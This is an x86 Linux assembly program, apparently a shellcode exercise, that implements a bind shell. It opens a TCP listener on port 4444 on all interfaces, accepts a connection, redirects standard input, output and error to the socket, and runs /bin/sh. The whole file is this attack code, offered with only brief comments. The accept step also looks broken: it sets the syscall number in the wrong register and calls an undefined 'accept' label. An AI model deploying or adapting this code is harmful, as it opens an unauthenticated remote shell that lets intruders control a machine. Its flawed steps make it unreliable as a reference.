global _start

section .text
_start:

        mov eax,0x66 ; socketcall (102)
        mov ebx,0x1 ; socket syscall
        push 0x0
        push 0x1 ; SOCK_STREAM
        push 0x2 ; AF_INET
        mov ecx,esp
        int 0x80
        mov [sockfd], eax

        mov word [servSA_sin_family], 0x2 ; AF_INET
        mov dword [servSA_sin_addr], 0x00000000 ; INADDR_ANY
        mov word [servSA_sin_port], 0x5c11 ; Port 4444 in network order

        mov eax,0x66
        mov ebx,0x2
        push 0x10 ; size of sockaddr_in (16)
        push servSA_sin_family
        push dword [sockfd]
        mov ecx,esp
        int 0x80

        mov eax,0x66
        mov ebx,0x4
        push 0x2
        push dword [sockfd]
        mov ecx,esp
        int 0x80

        mov eax,0x66
        mov ecx,0x5
        push client_size ; size of client SA
        push servSA_sin_family
        push dword [sockfd]
        call accept
        sub esp,0xc
        mov [newsockfd],eax

        mov eax,0x3f
        mov ebx, dword [newsockfd]
        mov ecx, 0x0
        int 0x80

        mov eax,0x3f
        mov ebx, dword [newsockfd]
        mov ecx,0x1
        int 0x80

        mov eax,0x3f
        mov ebx,dword [newsockfd]
        mov ecx,0x2
        int 0x80

        mov eax,0xb
        mov ebx,exec_string
        mov ecx,exec_array
        mov edx,dword [exec_null]
        int 0x80


section .data

        sockfd:         dd 0x00000000
        newsockfd:      dd 0x00000000

        client_size: dd 0x10

        servSA_sin_family:      dw 0x0000
        servSA_sin_port:        dw 0x0000
        servSA_sin_addr:        dd 0x00000000
        servSA_sin_zero:        dd 0x00000000, 0x00000000

        exec_string: db "/bin/sh", 0x0
        exec_array: dd exec_string
        exec_null: dd 0x00000000
